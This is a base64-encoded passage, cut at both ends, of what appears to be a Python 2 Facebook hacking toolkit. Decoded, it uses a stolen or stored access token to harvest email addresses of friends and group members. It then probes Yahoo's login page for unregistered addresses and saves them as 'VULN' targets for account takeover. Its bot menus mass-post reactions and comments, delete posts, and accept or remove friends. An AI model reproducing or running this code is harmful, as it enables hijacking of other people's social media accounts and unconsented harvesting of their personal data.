y50ZXh0KQ0KCQl0cnk6DQoJCQltYWlsID0gelsnZW1haWwnXQ0KCQkJeWFob28gPSByZS5jb21waWxlKHInQC4qJykNCgkJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpDQoJCQlpZiAneWFob28uY29tJyBpbiBvdHc6DQoJCQkJYnIub3BlbigiaHR0cHM6Ly9sb2dpbi55YWhvby5jb20vY29uZmlnL2xvZ2luPy5zcmM9ZnBjdHgmLmludGw9aWQmLmxhbmc9aWQtSUQmLmRvbmU9aHR0cHM6Ly9pZC55YWhvby5jb20iKQ0KCQkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlDQoJCQkJYnIuc2VsZWN0X2Zvcm0obnI9MCkNCgkJCQliclsidXNlcm5hbWUiXSA9IG1haWwNCgkJCQljbGljayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQ0KCQkJCXNlYXQgPSByZS5jb21waWxlKHInIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPi4qJykNCgkJCQl0cnk6DQoJCQkJCXBpY2tzID0gc2VhdC5zZWFyY2goY2xpY2spLmdyb3VwKCkNCgkJCQlleGNlcHQ6DQoJCQkJCWNvbnRpbnVlDQoJCQkJaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBpY2tzOg0KCQkJCQlzYXZlLndyaXRlKG1haWwgKyAnXG4nKQ0KCQkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybVZVTE7inJNcMDMzWzE7OTdtIF0gXDAzM1sxOzkybSIgK21haWwrIiBcMDMzWzE7OTdtPT4iK2ZiX25hbWUpDQoJCQkJCXN1Y2Vzc2Z1bC5hcHBlbmQobWFpbCkNCgkJZXhjZXB0IEtleUVycm9yOg0KCQkJcGFzcw0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCXByaW50ICdcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRG9uZSBcMDMzWzE7OTdtLi4uLicNCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKHN1Y2Vzc2Z1bCkpDQoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L0ZyaWVuZE1haWxWdWxuLnR4dCINCglzYXZlLmNsb3NlKCkNCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCW1lbnVfeWFob28oKQ0KDQojIyMjIyBZQUhPTyBNRU1CRVIgIyMjIyMNCmRlZiB5YWhvb21lbWJlcigpOg0KCWdsb2JhbCBmYl90b2tlbg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJdHJ5Og0KCQlvcy5ta2Rpcignb3V0JykNCglleGNlcHQgT1NFcnJvcjoNCgkJcGFzcw0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCgltcHNoID0gW10NCglqY3NiID0gMA0KCWlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpDQoJdHJ5Og0KCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWQrJyZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCgkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQ0KCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCW1lbnVfeWFob28oKQ0KCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJvbSBncm91cCBcMDMzWzE7OTdtLi4uJykNCglmcmllbmRzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK2lkKycvbWVtYmVycz9maWVsZHM9bmFtZSxpZCZsaW1pdD05OTk5OTk5OTkmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJbWl0Y2h5ID0ganNvbi5sb2FkcyhmcmllbmRzLnRleHQpDQoJc2F2ZSA9IG9wZW4oJ291dC9ncm91cE1haWxWdWxuLnR4dCcsJ3cnKQ0KCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQ0KICAgICAgICBwcmludCA0MioiXDAzM1sxOzk3beKVkCINCglmb3IgdyBpbiBtaXRjaHlbJ2RhdGEnXToNCgkJamNzYiArPTENCgkJbXBzaC5hcHBlbmQoamNzYikNCgkJaWQgPSB3WydpZCddDQoJCWZiX25hbWUgPSB3WyduYW1lJ10NCgkJbGlua3MgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWQrIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJeiA9IGpzb24ubG9hZHMobGlua3MudGV4dCkNCgkJdHJ5Og0KCQkJbWFpbCA9IHpbJ2VtYWlsJ10NCgkJCXlhaG9vID0gcmUuY29tcGlsZShyJ0AuKicpDQoJCQlvdHcgPSB5YWhvby5zZWFyY2gobWFpbCkuZ3JvdXAoKQ0KCQkJaWYgJ3lhaG9vLmNvbScgaW4gb3R3Og0KCQkJCWJyLm9wZW4oImh0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tIikNCgkJCQlici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQ0KCQkJCWJyLnNlbGVjdF9mb3JtKG5yPTApDQoJCQkJYnJbInVzZXJuYW1lIl0gPSBtYWlsDQoJCQkJY2xpY2sgPSBici5zdWJtaXQoKS5yZWFkKCkNCgkJCQlzZWF0ID0gcmUuY29tcGlsZShyJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4uKicpDQoJCQkJdHJ5Og0KCQkJCQlwaWNrcyA9IHNlYXQuc2VhcmNoKGNsaWNrKS5ncm91cCgpDQoJCQkJZXhjZXB0Og0KCQkJCQljb250aW51ZQ0KCQkJCWlmICcibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+JyBpbiBwaWNrczoNCgkJCQkJc2F2ZS53cml0ZShtYWlsICsgJ1xuJykNCgkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKyIgXDAzM1sxOzk3bT0+IitmYl9uYW1lKQ0KCQkJCQlzdWNlc3NmdWwuYXBwZW5kKG1haWwpDQoJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCXBhc3MNCglwcmludCA0MioiXDAzM1sxOzk3beKVkCINCglwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybURvbmUgXDAzM1sxOzk3bS4uLi4nDQoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihzdWNlc3NmdWwpKQ0KCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtIG91dC9ncm91cE1haWxWdWxuLnR4dCINCglzYXZlLmNsb3NlKCkNCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCW1lbnVfeWFob28oKQ0KDQojIyMjIyBZQUhPTyBGSUxFICMjIyMjDQpkZWYgeWFob29saXN0KCk6DQoJZ2xvYmFsIGZiX3Rva2VuDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCgl0cnk6DQoJCW9zLm1rZGlyKCdvdXQnKQ0KCWV4Y2VwdCBPU0Vycm9yOg0KCQlwYXNzDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCWZpbGVzID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHBhdGggXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpDQoJdHJ5Og0KCQl0b3RhbCA9IG9wZW4oZmlsZXMsInIiKQ0KCQltYWlsID0gdG90YWwucmVhZGxpbmVzKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJbWVudV95YWhvbygpDQoJbXBzaCA9IFtdDQoJamNzYiA9IDANCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykNCglzYXZlID0gb3Blbignb3V0L0ZpbGVNYWlsVnVsbi50eHQnLCd3JykNCglwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgltYWlsID0gb3BlbihmaWxlcywiciIpLnJlYWRsaW5lcygpDQoJZm9yIHB3IGluIG1haWw6DQoJCW1haWwgPSBwdy5yZXBsYWNlKCJcbiIsIiIpDQoJCWpjc2IgKz0xDQoJCW1wc2guYXBwZW5kKGpjc2IpDQoJCXlhaG9vID0gcmUuY29tcGlsZShyJ0AuKicpDQoJCW90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpDQoJCWlmICd5YWhvby5jb20nIGluIG90dzoNCgkJCWJyLm9wZW4oImh0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tIikNCgkJCWJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlDQoJCQlici5zZWxlY3RfZm9ybShucj0wKQ0KCQkJYnJbInVzZXJuYW1lIl0gPSBtYWlsDQoJCQljbGljayA9IGJyLnN1Ym1pdCgpLnJlYWQoKQ0KCQkJc2VhdCA9IHJlLmNvbXBpbGUocicibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQ0KCQkJdHJ5Og0KCQkJICAgICAgICBwaWNrcyA9IHNlYXQuc2VhcmNoKGNsaWNrKS5ncm91cCgpDQoJCQlleGNlcHQ6DQoJCQkgICAgICAgIGNvbnRpbnVlDQoJCQlpZiAnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPicgaW4gcGlja3M6DQoJCQkJc2F2ZS53cml0ZShtYWlsICsgJ1xuJykNCgkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybVZVTE7inJNcMDMzWzE7OTdtIF0gXDAzM1sxOzkybSIgK21haWwpDQoJCQkJc3VjZXNzZnVsLmFwcGVuZChtYWlsKQ0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCXByaW50ICdcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRG9uZSBcMDMzWzE7OTdtLi4uLicNCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKHN1Y2Vzc2Z1bCkpDQoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L0ZpbGVNYWlsVnVsbi50eHQiDQoJc2F2ZS5jbG9zZSgpDQoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgltZW51X3lhaG9vKCkNCg0KDQoNCiMjIyMjIE1FTlUgQk9UICMjIyMjDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMNCmRlZiBtZW51X2JvdCgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgxKQ0KCQlsb2dpbigpDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEJvdCBSZWFjdGlvbnMgVGFyZ2V0IFBvc3QiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gQm90IFJlYWN0aW9ucyBncm91cCBQb3N0Ig0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIEJPVCBDT01NRU5UIFRhcmdldCBQb3N0Ig0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIEJPVCBDT01NRU5UIGdyb3VwIFBvc3QiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gTWFzcyBkZWxldGUgUG9zdCINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTYuXDAzM1sxOzk3bSBNYXNzIGFjY2VwdCBmcmllbmQiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm03LlwwMzNbMTs5N20gTWFzcyBkZWxldGUgZnJpZW5kIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siDQoJcHJpbnQgIuKVkSINCgljaG9vc2VfYm90KCkNCiMvLy8vLy8vLy8vLy8NCmRlZiBjaG9vc2VfYm90KCk6DQoJYm90cyA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQ0KCWlmIGJvdHMgPT0iIjoNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiDQoJCWNob29zZV9ib3QoKQ0KCWVsaWYgYm90cyA9PSIxIjoNCgkJbWVudV9yZWFjdCgpDQoJZWxpZiBib3RzID09IjIiOg0KCQlncm91cF9yZWFjdCgpDQoJZWxpZiBib3RzID09IjMiOg0KCQlib3RfY29tbWVudCgpDQoJZWxpZiBib3RzID09IjQiOg0KCQlncm91cF9jb21tZW50KCkNCgllbGlmIGJvdHMgPT0iNSI6DQoJCWRlbGV0ZXBvc3QoKQ0KCWVsaWYgYm90cyA9PSI2IjoNCgkJYWNjZXB0KCkNCgllbGlmIGJvdHMgPT0iNyI6DQoJCXVuZnJpZW5kKCkNCgllbGlmIGJvdHMgPT0iMCI6DQoJCW1lbnUoKQ0KCWVsc2U6DQoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0Ig0KCQljaG9vc2VfYm90KCkNCg0KIyMjIyMgTUVOVSBSRUFDVCAjIyMjIw0KZGVmIG1lbnVfcmVhY3QoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMSkNCgkJbG9naW4oKQ0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLiBcMDMzWzE7OTdtTGlrZSIpDQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi4gXDAzM1sxOzk3bUxvdmUiKQ0KCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuIFwwMzNbMTs5N21Xb3ciKQ0KCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuIFwwMzNbMTs5N21IYWhhIikNCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LiBcMDMzWzE7OTdtU2FkQm95IikNCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm02LiBcMDMzWzE7OTdtQW5ncnkiKQ0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siDQoJcHJpbnQgIuKVkSINCgljaG9vc2VfcmVhY3Rpb24oKQ0KIy8vLy8vLy8vLy8vLy8vDQpkZWYgY2hvb3NlX3JlYWN0aW9uKCk6DQoJZ2xvYmFsIHRpcGUNCglhY3Rpb24gPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikNCglpZiBhY3Rpb24gPT0iIjoNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiDQoJCWNob29zZV9yZWFjdGlvbigpDQoJZWxpZiBhY3Rpb24gPT0iMSI6DQoJCXRpcGUgPSAiTElLRSINCgkJcmVhY3QoKQ0KCWVsaWYgYWN0aW9uID09IjIiOg0KCQl0aXBlID0gIkxPVkUiDQoJCXJlYWN0KCkNCgllbGlmIGFjdGlvbiA9PSIzIjoNCgkJdGlwZSA9ICJXT1ciDQoJCXJlYWN0KCkNCgllbGlmIGFjdGlvbiA9PSI0IjoNCgkJdGlwZSA9ICJIQUhBIg0KCQlyZWFjdCgpDQoJZWxpZiBhY3Rpb24gPT0iNSI6DQoJCXRpcGUgPSAiU0FEIg0KCQlyZWFjdCgpDQoJZWxpZiBhY3Rpb24gPT0iNiI6DQoJCXRpcGUgPSAiQU5HUlkiDQoJCXJlYWN0KCkNCgllbGlmIGFjdGlvbiA9PSIwIjoNCgkJbWVudV9ib3QoKQ0KCWVsc2U6DQoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0Ig0KCQljaG9vc2VfcmVhY3Rpb24oKQ0KIyMjIyNORVhUDQpkZWYgcmVhY3QoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCglpZGUgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIFRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykNCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpDQoJdHJ5Og0KCQlvaCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZGUrIj9maWVsZHM9ZmVlZC5saW1pdCgiK2xpbWl0KyIpJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQlhaCA9IGpzb24ubG9hZHMob2gudGV4dCkNCgkJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQlmb3IgYSBpbiBhaFsnZmVlZCddWydkYXRhJ106DQoJCQl5ID0gYVsnaWQnXQ0KCQkJcmVhY3Rpb24uYXBwZW5kKHkpDQoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3krIi9yZWFjdGlvbnM/dHlwZT0iK3RpcGUrIiZhY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK3lbOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uIFwwMzNbMTs5Mm1dIFwwMzNbMTs5N20nK3RpcGUNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCXByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihyZWFjdGlvbikpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCW1lbnVfYm90KCkNCglleGNlcHQgS2V5RXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gSUQgbm90IGZvdW5kIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQltZW51X2JvdCgpDQoNCiMjIyMjIEJPVCBSRUFDVCBncm91cCAjIyMjIw0KZGVmIGdyb3VwX3JlYWN0KCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS4gXDAzM1sxOzk3bUxpa2UiKQ0KCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuIFwwMzNbMTs5N21Mb3ZlIikNCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLiBcMDMzWzE7OTdtV293IikNCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LiBcMDMzWzE7OTdtSGFoYSIpDQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNS4gXDAzM1sxOzk3bVNhZEJveSIpDQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi4gXDAzM1sxOzk3bUFuZ3J5IikNCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBCYWNrIg0KCXByaW50ICLilZEiDQoJY2hvb3NpbmdfcmVhY3Rpb24oKQ0KIy8vLy8vLy8vLy8vLy8vDQpkZWYgY2hvb3NpbmdfcmVhY3Rpb24oKToNCglnbG9iYWwgdGlwZQ0KCWFjdGlvbiA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQ0KCWlmIGFjdGlvbiA9PSIiOg0KCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCINCgkJY2hvb3NpbmdfcmVhY3Rpb24oKQ0KCWVsaWYgYWN0aW9uID09IjEiOg0KCQl0aXBlID0gIkxJS0UiDQoJCXJlYWN0ZygpDQoJZWxpZiBhY3Rpb24gPT0iMiI6DQoJCXRpcGUgPSAiTE9WRSINCgkJcmVhY3RnKCkNCgllbGlmIGFjdGlvbiA9PSIzIjoNCgkJdGlwZSA9ICJXT1ciDQoJCXJlYWN0ZygpDQoJZWxpZiBhY3Rpb24gPT0iNCI6DQoJCXRpcGUgPSAiSEFIQSINCgkJcmVhY3RnKCkNCgllbGlmIGFjdGlvbiA9PSI1IjoNCgkJdGlwZSA9ICJTQUQiDQoJCXJlYWN0ZygpDQoJZWxpZiBhY3Rpb24gPT0iNiI6DQoJCXRpcGUgPSAiQU5HUlkiDQoJCXJlYWN0ZygpDQoJZWxpZiBhY3Rpb24gPT0iMCI6DQoJCW1lbnVfYm90KCkNCgllbHNlOg0KCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCINCgkJY2hvb3NpbmdfcmVhY3Rpb24oKQ0KIyMjIyNORVhUDQpkZWYgcmVhY3RnKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJaWRlID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBHcm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykNCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpDQoJdHJ5Og0KCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWRlKycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkNCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10NCglleGNlcHQgS2V5RXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlncm91cF9yZWFjdCgpDQoJdHJ5Og0KCQlvaCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6